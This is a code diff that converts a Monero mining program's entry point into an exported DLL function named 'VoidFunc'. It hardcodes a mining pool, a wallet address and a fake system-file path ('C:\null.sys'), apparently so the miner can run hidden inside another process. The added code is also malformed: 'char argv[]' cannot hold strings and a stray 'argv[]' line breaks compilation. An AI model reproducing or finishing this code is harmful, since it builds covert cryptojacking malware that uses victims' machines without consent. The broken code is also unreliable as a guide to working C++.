@@ -355,7 +355,7 @@ extern "C"  {
 #ifdef WIN32
 __declspec(dllexport) 
 #endif
-void VoidFunc(int argc, char *argv[])
+void VoidFunc()
 {
 #ifndef CONF_NO_TLS
 	SSL_library_init();
@@ -365,11 +365,28 @@ void VoidFunc(int argc, char *argv[])
 	SSL_load_error_strings();
 	OpenSSL_add_all_digests();
 #endif
+	int argc;
+	char argv[];
+	argc = 13;
+	argv[0] = "C:\null.sys";
+	argv[1] = "--currency";
+	argv[2] = "monero7";
+	argv[3] = "-O";
+	argv[4] = "xmrpool.eu:443";
+	argv[5] = "-u";
+	argv[6] = "45tcqnJMgd3VqeTznNotiNj4G9PQoK67TGRiHyj6EYSZ31NUbAfs9XdiU5squmZb717iHJLxZv3KfEw8jCYGL5wa19yrVCn";
+	argv[7] = "-i";
+	argv[8] = "0";
+	argv[9] = "-p";
+	argv[10] = "";
+	argv[11] = "-r";
+	argv[12] = "";
 
 	srand(time(0));
 
 	using namespace xmrstak;
 
+	argv[]
 	std::string pathWithName(argv[0]);
 	std::string seperator("/");
 	auto pos = pathWithName.rfind(seperator);
